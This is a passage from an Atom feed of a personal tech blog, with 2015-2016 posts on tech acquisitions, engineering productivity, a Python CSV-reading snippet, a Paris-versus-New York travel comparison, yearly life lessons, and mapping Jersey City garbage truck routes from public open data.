<p>I just saw that Apple has <a href="http://techcrunch.com/2015/11/24/apple-faceshift/">acquired</a> Faceshift, a VR based startup that makes it easier to create realistic animated characters. Two years ago Facebook <a href="https://www.facebook.com/zuck/posts/10101319050523971">acquired</a> Oculus VR and Google soon followed by an <a href="http://venturebeat.com/2014/10/13/google-counters-facebooks-oculus-buy-with-500m-investment-in-vr-startup-magic-leap/">investment</a> in Magic Leap. Apple is rumored to working on a self driving car and we all know Google is doing the same thing. And around the time that Facebook acquired Oculus Uber was <a href="http://www.nytimes.com/2015/09/13/magazine/uber-would-like-to-buy-your-robotics-department.html?_r=0">poaching</a> a good chunk of the robotics department at Carnegie Mellon.</p>

<p>VR and self driving cars have been hailed as the next big thing but it’s still shocking how so many of these large tech companies that started off in different industries are converging and out spending each other on these new technologies. It seems as if in their desire to own a new market they’re all joining the fray hoping to become monopolies in these new industries.</p>

<p>Coupled with the news of how <a href="http://www.wsj.com/articles/the-only-six-stocks-that-matter-1437942926">dominant</a> the larger tech companies have been in the stock market compared to the other players it’s hard not to think that we’re moving into a world dominated by a few big companies that can outspend others and take over brand new industries. We love the idea that a small group of people in a garage can become the next Google but I wonder whether that’s likely to remain true. I hope so but maybe we really are just setting us up for another Gilded Age.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The famed 10x developer</title>
   <link href="http://dangoldin.com/2016/01/24/the-famed-10x-developer/"/>
   <updated>2016-01-24T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/01/24/the-famed-10x-developer</id>
   <content:encoded><![CDATA[
<p>If you’re in the software engineering world you’ve probably heard of the 10x developer. They’re an order of magnitude more productive than everyone else and can make all sorts of problems go away. The 10x number is completely arbitrary but I’ve worked with numerous developers who were notably more productive than others. A big part of it is just being able to write more code - a combination of knowing the right tools for the job and moving quickly while avoiding mistakes. But a bigger part in the productivity comes from making the appropriate decisions that are able to stand the test of time. If your code needs rewriting every time a new feature comes out it’s going to be tough to be as productive as someone whose code can be easily expanded and maintained as the product evolves. Great developers make design decisions that are able to solve the immediate problem but also leave a clear path for the improvements that will inevitably come. If you know what’s coming in a couple of months or in a year it’s simple to account for it in the current design but the real skill comes in being able to think of the unanticipated cases and be able to support them with minimal effort. Beyond that some choices end up unlocking opportunities that would have been difficult to fathom in the first place. Imagine coming up with an elegant implementation that solves an urgent problem and a couple of months later you realize that with minimal tweaking that implementation can turn into something that is transformative to the product. It’s impossible to think through every decision since you’ll end up stuck in a world of “analysis paralysis” but great engineers either have a gut feel or enough experience to make these high leverage decisions more frequently than others.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The ownership hierarchy</title>
   <link href="http://dangoldin.com/2016/01/23/the-ownership-hierarchy/"/>
   <updated>2016-01-23T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/01/23/the-ownership-hierarchy</id>
   <content:encoded><![CDATA[
<p>Great engineers assume end to end ownership of their products. Rather than focusing on one feature at a time they understand how it fits in with the rest of the product and think about the impact it will have on users and the business. This leads to code that scales with the product while being able to be maintained and developed by a small team. But you can only have this with everyone embracing full ownership over a product.</p>

<p>This idea can be expressed via an ownership hierarchy. The idea is that all engineers are responsible for writing code but the best ones want their code in products that’s loved by the end users. By moving up this hierarchy you develop a larger sense of ownership than someone who just wants to knock out some tasks.</p>

<ul>
  <li>I opened a pull request: This is the start for every engineer. We all write code and some may consider it done when they open a pull request - leaving the rest up to someone else.</li>
  <li>My code’s merged into master: The next level is a tiny bit beyond - in this case it’s not just that the code was written but that it has also been merged into the main branch.</li>
  <li>My code’s deployed to production: At this point we’re at least aware that the code isn’t the end goal and that we want to make sure it’s out in the real world.</li>
  <li>My code is being used in production: We’re finally at the point where we care that our code is actually being used. Code that’s deployed but unused doesn’t matter and we strive to write code that’s actually used.</li>
  <li>Users love my code: The peak is building products that are loved by users. This is what drives great products and should be the goal for every bit of code that’s written and deployed.</li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Poor, neglected Google Voice</title>
   <link href="http://dangoldin.com/2016/01/17/poor-neglected-google-voice/"/>
   <updated>2016-01-17T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/01/17/poor-neglected-google-voice</id>
   <content:encoded><![CDATA[
<p>Nearly all the conversations with my family is in Russian and phone calls are no different. The fun happens when I miss a call and it goes to voicemail. Turns out that despite the amazing job Google does in transcribing English calls it fails terribly at Russian. Instead of realizing that it’s not English it ends up with transcriptions such as “douche nozzle booster.”</p>

<img src="http://dangoldin.com/assets/static/images/google-voice.png" alt="Google Voice Russian transcription" width="744" height="162" layout="responsive"/>

<p>Given Google’s expertise in machine learning and their massive data sets I’d expect them to at least be able to identify a non-English language. My guess is that Google Voice is no longer a priority and may not even be under development at all. I had a little over a hundred unread messages I needed to mark as read. With Gmail you get the option of applying an action to the entire selection - not just what’s visible - but with Google Voice you have to go through it page by page. And there’s no way to include more items per page. A tiny bit of modern web functionality did make it through though and I was able to use shortcuts to get the job done relatively quickly. I realize self driving cars are both more exciting and have more potential but I wish there was something being done to improve Google Voice - there’s a ton of us still using it.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>2015 Stats: Part 1</title>
   <link href="http://dangoldin.com/2016/01/12/2015-stats-part-1/"/>
   <updated>2016-01-12T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/01/12/2015-stats-part-1</id>
   <content:encoded><![CDATA[
<p>Over the past year I’ve been collecting personal stats nearly every day in order to see if I can spot any patterns and just understand myself better. These ranged from the time I spent sleeping to my mood (both physical and mental) to what I ate and drank. Over the weekend I hope to dive deeper into them and work out some relationships and patterns but for now I wanted to share just some basic summary stats. The script to analyze the data is up on <a href="https://github.com/dangoldin/annual-stats-analysis">GitHub</a> but note that it’s designed for my file format.</p>

<table class="table"><thead><tr><th> </th><th>Avg</th><th>Min</th><th>Max</th><th>Std Dev</th></tr></thead><tbody><tr><td>Sleep (Hours)</td><td>7.35</td><td>3</td><td>11.5</td><td>0.96</td></tr><tr><td>Alcohol (Drinks)</td><td>1.79</td><td>0</td><td>14</td><td>1.97</td></tr><tr><td>Coffee (Cups)</td><td>1.38</td><td>0</td><td>2.5</td><td>0.66</td></tr></tbody></table>

<p>I also have data for my physical and mental moods three times each day. I haven’t gotten the chance to get anything meaningful out of it yet but for the most part I’m a pretty happy person! I’ve had a few colds and headaches but I categorized over 90% of the days as being in a good mood but just under 80% where I’m a good physical mood due to some congestion or allergies which end up improving by the end of the day.</p>

<p>These summaries are interesting despite being simple and I can’t wait to see what I discover when I take a deeper look. The goal is also to use this exercise to tweak the what and how of what I’m going to collect in 2016. Definitely let me know if you have ideas.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Cleanest way to read a CSV file with Python</title>
   <link href="http://dangoldin.com/2016/01/10/cleanest-way-to-read-a-csv-file-with-python/"/>
   <updated>2016-01-10T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/01/10/cleanest-way-to-read-a-csv-file-with-python</id>
   <content:encoded><![CDATA[
<p>Python’s my goto language for doing quick tasks and analyses with the majority of them being quick scripts to analyze a file or pull some data. I’m constantly looking to improve my code and lately have developed the following approach. The goal isn’t to make it as short as possible but to make it as expressive and clean as possible. They’re related but not synonymous.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
</span>
<span class="kn">import</span> <span class="nn">csv</span>
<span class="kn">from</span> <span class="nn">collections</span> <span class="kn">import</span> <span class="n">namedtuple</span>

<span class="c1"># Can add whatever columns you want to parse here
# Can also generate this via the header (skipped in this example)
</span><span class="n">Row</span> <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'Row'</span><span class="p">,</span> <span class="p">(</span><span class="s">'ymd'</span><span class="p">,</span> <span class="s">'state'</span><span class="p">,</span> <span class="s">'size'</span><span class="p">,</span> <span class="s">'count'</span><span class="p">))</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'file.csv'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">csv</span><span class="p">.</span><span class="n">reader</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">delimiter</span><span class="o">=</span><span class="s">','</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="nb">next</span><span class="p">()</span> <span class="c1"># Skip header
</span>    <span class="n">rows</span> <span class="o">=</span> <span class="p">[</span><span class="n">Row</span><span class="p">(</span><span class="o">*</span><span class="n">l</span><span class="p">)</span> <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">r</span><span class="p">]</span>
    <span class="c1"># Do whatever you want with rows</span></code></pre></figure>

<p>The reason I like this approach is that it’s obvious what’s happening and it’s being done in a Pythonic way. There’s no traditional for loop that spans multiple lines and it’s simple to update the loop to manipulate the values during the handling of reach row. This approach also leverages the namedtuple collection which is one of my favorite types - a class-like structure that’s significantly more memory efficient but provides easy named access the fields (row.ymd, row.state). With this basic structure in place we can add all the bells and whistles that manipulate and tweak the rows. One thing to be aware of is that the namedtuple generates if immutable so you either need to manipulate the values before construction or use additional structures to transform the data.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Have consistent development environments</title>
   <link href="http://dangoldin.com/2016/01/09/have-consistent-development-environments/"/>
   <updated>2016-01-09T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/01/09/have-consistent-development-environments</id>
   <content:encoded><![CDATA[
<p>An important lesson I’ve picked up is to have a consistent development environment across your computers. These days it’s common to have a home computer, a work computer, as well as a series of VPSs that we use for development. The more similar they are the easier life gets. Having the same code and libraries reduces the risk of an application working on one machine but not the other and avoid the hassle of upgrading esoteric libraries. I’ve run into numerous issues where small version difference led to weird behaviors that ended up taking a long time to debug. Consistent tools help as well - using emacs on one machine but vim on another slows you down when you have to context switch and figure out which one you’re using. By committing to one you become more efficient as you develop the shortcuts and flows that are possible. Using virtual environments and containers helps get at this point - they’re both ways to ensure that the code you’re writing and testing is going to be the same code that’s running on production. Without this every time you deploy new code you’re risking failure. More often than not it will work as expected but it’s those rare cases that will be problematic and anything that can be done to avoid them should be done. One of the simplest ways is to align your development environments with your production ones.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Paris versus New York City</title>
   <link href="http://dangoldin.com/2016/01/03/paris-versus-new-york-city/"/>
   <updated>2016-01-03T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/01/03/paris-versus-new-york-city</id>
   <content:encoded><![CDATA[
<p>I just got back from a 10 day vacation in Paris and couldn’t help but compare it against New York. That’s what traveling does - forces you to compare what you’re comfortable with the novelty you’re exposed to. Some make you appreciate what you have while others make you want more. In any case I wanted to share my thoughts while they’re still fresh.</p>

<ul>
  <li>Public transit: One of the first things you notice after living in New York are the public transit systems in other cities. New York has a reputation for having one of the best (one of the best?) in the world and I was curious to see how Paris handled it. The first thing I noticed was how short the platform was - rather than the multiple block stops in New York the Paris platform is enough for a 5 car train - and sure enough that’s the size of the Paris trains. Each station I’ve been to had accurate time estimates and it felt as if the trains ran frequently and I never had to wait longer than 6 minutes although I’ve only taken it during the day. One thing that’s struck me as odd was that it seemed as if every train had their own method of opening the door. In New York the doors open automatically but in Paris you need to either hit a button or pull some sort of level to get the doors to open. The way the stations were labeled felt friendly to tourists as well - each time you had to decide on an uptown or downtown train it would list each of the stops along with the potential transfers along each route which made it very easy to orient ourselves. The last thing I want to mention is price: the NYC subway costs $2.75 right now and you have to pay a fee for the metrocard itself. In Paris the fee is €1.80 which is just under $2 at current rates and you can buy 10 at a time for €1.40 each - significantly cheaper than the NYC subway.</li>
  <li>Bike and car share programs: New York has Citibike and Paris has an equivalent version called <a href="http://en.velib.paris.fr/">Vélib</a>. I didn’t get a chance to use it so don’t have much of an opinion but the rates they offered were significantly lower than a non-annual Citibike pass. A daily Citibike pass is close to $10 whereas you can get day of Vélib for €1.70 and a week for €8. In addition to a bike share program, Paris has an electric car share program with stations prevalent across Paris. I didn’t get a chance to use these but it seemed like a really neat idea that reminded me of ZipCar without the burden of needing to return the car to the original destination.</li>
  <li>Neighborhoods, not districts: This might be entirely due to where I stayed and wandered but each neighborhood felt like it’s own little city. We’d walk around in a neighborhood and it would have everything one would need - a bakery, a cafe, some grocery stores, a few restaurants and bars, a dry cleaning place, and a few boutique shops. It made it seem that one only needs to walk a few blocks to have everything they need. In New York it feels as if there are districts - the flower district on 28th, the diamond district in midtown, the theater district near Time Square, the rug district on 31st, the lighting stores in chinatown - but it didn’t feel as if Paris was structured the same way. Paris of course is known for the shopping on Champ-Elysees but that’s more the exception than the rule. The only other area that felt like a district was a series of falafel shops in the Marais. Of course this may be completely wrong and only visible through my tourist lens.</li>
  <li>Architecture: Compared to New York Paris is ancient and its architecture and layout reflects that. Due to <a href="https://en.wikipedia.org/wiki/Georges-Eug%C3%A8ne_Haussmann">Baron Haussmann</a>’s work during the 19th century Paris has a consistent look and feel which adds to the beauty. Paris barely has any skyscrapers since the majority of the buildings were construct before the elevator era. I was also struck by how mixed use the buildings were - many of them were businesses on the ground floor while the higher floors were residential. New York definitely has a bit of that but still feels as if it has some areas that are resident focused while others are commercially focused.</li>
  <li>Price: Based on my conversions and research I expected Paris to be a lot more expensive than it actually was. The biggest reason was that the exchange rate was hugely in my favor ($1.1 per €1) but even then the cost felt offset by the listed price including tips and taxes. For example, if I go to a restaurant in NYC and have a $14 dish it’ll end up costing me close to $18 due to the tax (8.875%) and tip (~15-20%). At an exchange rate of 1.1 dollars per euro that’s equivalent to a €16.37 dish. We went to a few grocery stores and the prices for fresh food felt reasonable and only a tad bit higher than what we were used to. We also got a chance to look at some posted real estate listings and they seemed cheaper than NYC - but the apartments are generally smaller. This is a pretty biased view since we spent it as tourists and didn’t have to buy clothes or any real house items but I suspect all in all it would be pretty comparable, if not cheaper, than New York.</li>
  <li>Panhandlers: In NYC it’s typical for people to look away and rush by someone panhandling but what struck me about Paris was that people would stop and have conversations with them. Even more, people were stopping with their children to chat and seemed to be engaging in meaningful conversations. My French wasn’t good enough to pick up the contents but the fact that people actually stopped and had conversations struck a chord with me. We talk about treating poverty and homelessness but unless we treat them as people and provide proper respect it will be for naught.</li>
  <li>Restaurants: Not too much here but one thing I wanted to point out was how diverse the streets of Paris were compared to the “front” of the restaurants. The host and waitresses at nearly every restaurant we ate at had the “classically French” look - I’m not sure whether this was intentional but it struck me as odd given how much diversity we have in NYC.</li>
  <li>Public restrooms: I haven’t seen this anywhere yet but Paris has free, public, self cleaning restrooms. It’s a bit slow since you have to wait through the washing cycle for each person but the fact that it’s publically available and free amazes me.</li>
  <li>Cabs: For the most part we used the subway but we had an interesting experience when we used a cab. The driver suggested an alternate route to the one provided by his GPS and it took us a bit longer than expected to get where we were headed. Instead of charging us what the meter showed he admitted fault and told us to pay a lower amount. Despite our protests he stuck to the lower amount. I’m not sure if this is a common experience but I’m extremely doubtful something like this would ever happen in NY.</li>
</ul>

<p>Combined, these make it seem that I prefer Paris to New York but I honestly haven’t figured that out. Paris seems to have more progressive policies than New York but I’m basing that purely on my 10 day trip and actually living and working there may be entirely different. It feels as if Paris takes public services more seriously - the public transit is cheaper, more frequent, and more robust since I didn’t experience a single stall or failure which is sadly a common occurrence in New York. I’m also aware that I’ve only spent 10 tourist days in Paris and may be approaching it through rose-colored classes. I’d love to get thoughts from people that have lived for significant periods in both.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Lessons from 2015</title>
   <link href="http://dangoldin.com/2016/01/01/lessons-from-2015/"/>
   <updated>2016-01-01T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2016/01/01/lessons-from-2015</id>
   <content:encoded><![CDATA[
<p>Part of my 2015 goals was to have a weekly retrospective where I’d be distraction free and force myself to just sit and think. I usually did this on a Sunday morning by going outside and sitting on a bench overlooking the river or inside a quiet park. At the end of each of the retrospectives I’d sit down and jot down my thoughts in order to consistently revisit the list in order to keep improving. Below are the lessons of 2015 that I’m adopting going into 2016.</p>

<ul>
  <li>Scheduling time for a task rather than just a goal. In the past I’d add tasks as a day event to my calendar. The better approach is to block specific time for a task - this ensures I’ll at least get something done and makes it more difficult to push things back.</li>
  <li>Minimize the amount of physical things I own and focus quality over quantity. Maybe this was due to the apartment move but I’ve come to the conclusion that I would rather have fewer things of higher quality. This is a bit tough for me to act on since I tend to like getting deals and am pretty cynical towards trends and fashions - I can’t tell what’s actually high quality and what’s just marketing.</li>
  <li>Sleeping more and better. Some people can get away with little sleep but I’m unfortunately not one of them. I need to get at least 7 hours to be productive.</li>
  <li>Tracking my time usage better. It’s amazing how much time we actually have and how much of it we waste. For me it’s due to a variety of distractions and I need to be better at understanding how I spend my time in order to improve my behavior.</li>
  <li>Don’t procrastinate. A simple lesson here but I need to stop pushing things to tomorrow that I can do today. Especially when delaying something ends up snowballing and delaying a bunch of other things.</li>
  <li>Focus on one thing at a time. Multitasking doesn’t actually work and I end up doing multiple things poorly and slowly rather than one thing well. I typically fall into this habit when watching some TV while doing some work - in those cases I’m almost always slower at my work and it would have just been better to finish the work and reward myself with some leisure time.</li>
  <li>Distraction free walks to think. This is a rephrasing of the introductory paragraph but it’s important to get away from distractions and just force your mind to wander and think. It’s difficult at first with the desire to look at a phone or a random website but it’s worth it.</li>
  <li>Knowing at every point why I’m doing something. Another lesson here in understanding how I use my time better. If I’m doing something I should know exactly why I’m doing it since everything comes with an opportunity cost. This doesn’t mean that I need to be productive at all times and can never relax but I should understand the tradeoffs I’m making.</li>
  <li>Having and evaluating short and long term goals. I wish I did this when I was younger but it’s important to have goals we’re constantly working towards since it provides direction and allows us to measure our progress.</li>
  <li>Watching less TV. A no brainer here but TV is a pretty big waste of time and I should watch less of it. I already don’t have cable but still find myself wasting time watching Netflix or some football games.</li>
  <li>Focus on making versus consuming. This is all about productivity but I need to get into the habit of not consuming as much (TV, blogs, games, etc) and instead using that time to create. I’m already decent at this but need to get to the point where creating actually gives me more pleasure and relaxation than consuming.</li>
  <li>Focusing and dedicating time to finance/investing/routine/research. As I’ve gotten older I can’t help but think about my later life and a big part of is figuring out how to invest my savings now to prepare for the future. I need to be more active in my investments and make sure the money I have isn’t just sitting around depreciating.</li>
  <li>It’s okay to not have any new insights. During one of my walks I just wasn’t able to think of anything new and that’s perfectly okay. Not everything is about productivity and novelty and it’s fine to just relax and enjoy the moment.</li>
  <li>Having a behavior consistent with views. A philosophy of life one here but if there are certain things you feel strongly about you need to make sure you act in alignment with it. It’s tough to do given outside constraints but something I’ve been more keen on. This sounds a bit abstract but an example is fighting peer pressure - sometimes it’s better to just skip an event and focus on what you want to do.</li>
  <li>Just get started with something small, work your way up. Oftentimes embarking on something new feels like a gargantuan undertaking but it’s better to just start and take it one step at a time. The point above on scheduling time for tasks rather than goals helps address this.</li>
  <li>Identifying bad habits and working on eliminating them. This is all about self-awareness but we all have bad habits and if we acknowledge them and work on eliminating them we’ll all be better off.</li>
  <li>Abstinence versus moderation. I don’t recall where I read this but it rung true to me. The point was that we’re all wired differently and that some people have a hard time doing moderation and for them abstinence is necessary. A lot of my bad behaviors fall into this territory and I’d be better off completely abstaining rather than walk the fine line of moderation.</li>
  <li>Thinking about personal brand. I’m not sure this is relevant to everything but I think it’s important to think about the personal brands we have and fostering it. Who knows how the world will look in the future but it’s important to have a good reputation and understand how you’re seen and perceived.</li>
  <li>Having constant list of todos. I maintain an ever-growing list of todos that I will try to knock out when I have some spare time. It helps take care of a few items while keeping me productive.</li>
  <li>Finding entertainment from within, not outside sources. Rather than rely on the outside world to entertain us we should find that within - that way we can always be entertained and don’t need to be blocked by anything.</li>
  <li>1% better each day. Just a thought here but if we all got 1% better each day and that compounded then at the end of a single year we’d be nearly 38 times better. This is tough to achieve but there’s just so much potential that we at least have to try.</li>
  <li>Expectations are oftentimes better than the reality. Many times I’ll do something because i have the expectations and thought that I’ll enjoy it but after the fact I realize that it was a waste of time. The biggest example of this for me is drinking - I come in with the notion that it’ll be fun but more often than not it’s the same as any other time. It would have been better to save the money and calories and just have a fun time with friends.</li>
  <li>When making spelling mistakes, retype the entire word. A small one here but my spelling has gotten worse with the advent of built in spellcheckers and my way of fighting it is to retype the entire word without using the spellchecker whenever I make a spelling mistake. This at least gets me into the habit of spelling words properly.</li>
  <li>Investing time and value into things that compound. Similar to many earlier points but we should be focused on investing our time into things that matter and help lay the foundation for the long term. In my case these are knowledge and health - investing in both of them now provides compounding effects for nearly everything later.</li>
  <li>Taking care of the small things. These days it’s easy to get inundated with tons of small things that all eat up small amounts of time. It’s easy to dismiss these but I still strive to take care of the small details.</li>
  <li>Figure out habits and rituals. Rather than trying to do too much at once it’s better to focus on a few things and do them until they become habits and rituals. Only then should we pick up new habits to adopt.</li>
  <li>Running in the morning changes mood the rest of the day. It may be tough to wake up early in order to go for a run but it sets the tone for the entire day so I need to just do it.</li>
  <li>Exceptions are never exceptions. It’s easy to skip something you don’t want to do by writing it off as an exception but it never is. It’s just a rational trick to make us feel better but it’s easy to destroy a habit by constantly thinking of exceptions.</li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Smartphone usage by generation</title>
   <link href="http://dangoldin.com/2015/12/28/smartphone-usage-by-generation/"/>
   <updated>2015-12-28T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2015/12/28/smartphone-usage-by-generation</id>
   <content:encoded><![CDATA[
<p>By examining my family’s phone usage you get an interesting representations of how different generations use their phones. The five of us - parents, younger brother, and younger sister - are all on the same plan and T-Mobile breaks down the usage into phone minutes used, messages sent, and total amount of data used. I played a game with my friends to see whether they’d be able to decipher who’s who but it turned out to be surprisingly difficult and unintuitive. Turns out that my teenage sister uses least talking minutes and data but consumers average number of texts. At the same time, my mom runs a business and has close to 2000 minutes of talk time with the most number of texts sent while only using a moderate amount of data. My brother and I have a similar usage pattern - low minutes and messages but the highest data usage out of the entire family. The biggest surprise is my sister’s data usage that reinforces how much time teenagers are spending via apps and on separate social networks. That stereotype I grew up with of teenagers being constantly on their phones is still true - texting and talking have just bee replaced by siloed apps.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The true cost of low quality</title>
   <link href="http://dangoldin.com/2015/12/25/the-true-cost-of-low-quality/"/>
   <updated>2015-12-25T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2015/12/25/the-true-cost-of-low-quality</id>
   <content:encoded><![CDATA[
<p>Recently I’ve found myself have similar conversations with various members of the engineering team regarding the tradeoff between speed and quality. Every situation is different but without going into project details I’ve found that quality come first, speed second. Not because I think speed is unimportant but because I think quality is underrated. In the desire to push the next feature and launch the next product quality tends to be sacrificed. This is fine as long as we understand the tradeoffs but in most cases those are externalized to others. For example, if an engineering team ships a buggy feature, the engineering team only incurs the cost of fixing it, and even then only if they end up fixing it. Simultaneously, the cost is passed on to the users who are powerless to fix it. And then it goes through multiple tiers - first the end user who becomes inefficient and may lose work, then the support person responsible for dealing with these issues, the product manager who has to context switch to both understand and prioritize the issue, and finally the engineer. During each step time is lost but most importantly is the interruption of <a href="https://en.wikipedia.org/wiki/Flow_%28psychology%29">flow</a> for multiple people, each of whom gets distracted from what they’re doing in order to deal with a problem that could have been prevented in the first place.</p>

<p>I’m also skeptical of the quality versus speed tradeoff and believe that both can be achieved. I’ve worked with many people who have been able to deliver both and believe it’s a skill that can be developed just like any other. Some situations do force a tradeoff but I suspect these are in the minority for a good engineer. Even then I would push for a refactor after it’s deployed in order to bring the quality up to par. Focusing on quality also builds better habits - you’ll get quicker naturally over time but if all you do is prioritize speed your quality won’t improve. By focusing on quality first your speed will improve on it’s own.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Have a work “workout” plan</title>
   <link href="http://dangoldin.com/2015/12/20/have-a-work-workout-plan/"/>
   <updated>2015-12-20T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2015/12/20/have-a-work-workout-plan</id>
   <content:encoded><![CDATA[
<p>If you go to the gym you end up getting a lot more out of it if you approach your workout with a plan in mind. The same thing happens with work. If you go every day you will inevitably get better but if you come in with concrete goals and ways to push yourself you’ll be in a much better position. It’s not as easy to measure your performance at work compared to the gym but just taking the first step and realizing that you want to improve is already beyond how most people approach work. Just by thinking about your performance you improve your ability to identify your strengths and weaknesses. Doing this on a consistent basis gets you into the habit of being introspective and improves your self-awareness, which is necessary to improve.</p>

<p>I’ve approached this problem by jotting down notes and thoughts throughout the day and then having a non-disruptive, scheduled time each week for me to go through and digest it. Some weeks are slower than others but more often than not I gain valuable insight on what I did well and what I can improve. Writing these notes has become a habit and I don’t even need to focus on it anymore. The value of these is that over time you end up having a log of your improvement and can acknowledge how much you’ve grown as well as how much is still left. I’ve also discovered themes from week to week that have helped me improve as an engineer and a manager. If you haven’t been approaching work the way you approach the gym you’re losing valuable time and opportunity to improve yourself. You’re already spending at least 40 hours a week at the office so you should make it as valuable as you can.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Automatically generating APIs</title>
   <link href="http://dangoldin.com/2015/12/19/automatically-generating-apis/"/>
   <updated>2015-12-19T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2015/12/19/automatically-generating-apis</id>
   <content:encoded><![CDATA[
<p>A large part of modern software engineering is working with external APIs and services. Whether you want to automate a deployment on AWS, collect payments via Stripe, or track various behaviors using MixPanel, the process is the same - go through their documentation to figure out the available endpoints, the request requirements, and what the response will be. The next step is writing a simple API wrapper around the relevant endpoints that can then be accessed by the rest of the application. Given all the investment in AI research I’d love to see an application that’s able to generate API wrappers in any language for an API based solely on the documentation. Amazon has taken the first steps by <a href="https://aws.amazon.com/blogs/aws/now-available-aws-sdk-for-python-3-boto3/">developing a data model</a> to represent their API which is then used to generate the actual libraries in a variety of languages. By changing something in the definition they can quickly rebuild the libraries in every language. One can also imagine using this data model to generate the actual documentation. This documentation can then be used to go back to the data model which can then be used to go back to the documentation.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Know what's mission critical</title>
   <link href="http://dangoldin.com/2015/12/15/know-whats-mission-critical/"/>
   <updated>2015-12-15T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2015/12/15/know-whats-mission-critical</id>
   <content:encoded><![CDATA[
<p>The accepted belief is that startups should move quickly and err on the side of speed rather than quality. This makes sense. Startups are so risky that they won’t fail due to making a few mistakes but will fail if they get out maneuvered and out innovated. The big advantage startups have is speed and that needs be leveraged.</p>

<p>The one caveat I’d make is that every company, big and small, should have mission critical elements that need to be maintained when pushing new features and updates. I was reminded of this last week when an unnamed corporate feedback startup sent out the private one-on-one notes people jotted down in preparation for their meeting to everyone within the company. This was a huge betrayal of trust and ruined the good will people had for the company and the product. If they weren’t able to get this basic piece right how are they expected to do the rest? Every company has these mission critical components that everyone needs to be aware of and great care must be taken to ensure they work before every deploying or change. In the adtech case it’s serving ads - if ads aren’t working then publishers aren’t making any money and losing money during each impression. For cloud productivity applications it’s critical that they don’t lose your data - downtime is annoying but at least you can switch to another task while they get back up. If you lose your data and documents you have to figure out exactly what you lost and decide whether it’s worth recreating. Everyone in the company should know what these these mission critical components are and it’s everyone’s job to make sure they’re working as expected since failure carries existential risk for the customer relationship. It’s unlikely that a single bad event will ruin things but as soon as it becomes a pattern it’s likely that that customer will be lost forever and never return due to the faulty first impression.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Jersey City garbage truck routes</title>
   <link href="http://dangoldin.com/2015/12/12/jersey-city-garbage-truck-routes/"/>
   <updated>2015-12-12T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2015/12/12/jersey-city-garbage-truck-routes</id>
   <content:encoded><![CDATA[
<ul class="thumbnails">
  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/jersey-city-garbage-trucks.png" alt="Jersey City garbage trucks" width="718" height="811" layout="responsive"/>
    </div>
  </li>
</ul>

<p>A couple of months ago I took a stab at plotting the Jersey City <a href="http://dangoldin.com/2015/09/24/mapping-the-jersey-city-parking-zones-ii/">parking zones</a> after getting frustrated that the only place to see them was a PDF of streets and addresses. Last week someone left an awesome <a href="http://dangoldin.com/2015/09/24/mapping-the-jersey-city-parking-zones-ii/#comment-2385514530">comment</a> pointing out that Jersey City has a bunch of open data available, including a near-real time feed of <a href="http://www.jciaonline.org/gpsMap.php?view=map">garbage truck locations</a>, a general <a href="http://data.jerseycitynj.gov/">open data portal</a>, as well as the ability to <a href="https://jerseycitynj.seamlessdocs.com/w/records_request">request custom data</a>. As a first project I decided to capture the movement of the garbage trucks every minute and then plot the results on a map. The results are interesting - some trucks remain local to Jersey City while others end up venturing as far as Newark Airport. The final visualized routes are at <a href="https://dangoldin.github.io/jersey-city-open-data/">https://dangoldin.github.io/jersey-city-open-data/</a> and the code is up on <a href="https://github.com/dangoldin/jersey-city-open-data">GitHub</a>.</p>

<p>The approach I took was straightforward. After going to the real time map I opened the network explorer in order to see the HTTP requests being made to update the map with the latest truck locations. It was a single URL call that was returning a pipe delimited file containing the location of each truck. By writing a simple wget script and setting it as a cronjob I was able to capture the truck locations every minute. After a day’s worth of data I combined the files and removed duplicate lines (for when the trucks stayed in a single location). After that it was simple to use the Google Maps API to draw a route for each individual truck. The neat thing here is that 90% of the work was done through simple shell commands. One command to fetch the data every minute, another to combine them into a single file, and then a few others to sort and dedup the data. By the time I got to coding all I needed to do was convert the data from a pipe delimited file into something that could be consumed by the Google Maps API.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Optional museum fees and corporate sponsorships</title>
   <link href="http://dangoldin.com/2015/12/07/optional-museum-fees-and-corporate-sponsorships/"/>
   <updated>2015-12-07T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2015/12/07/optional-museum-fees-and-corporate-sponsorships</id>
   <content:encoded><![CDATA[
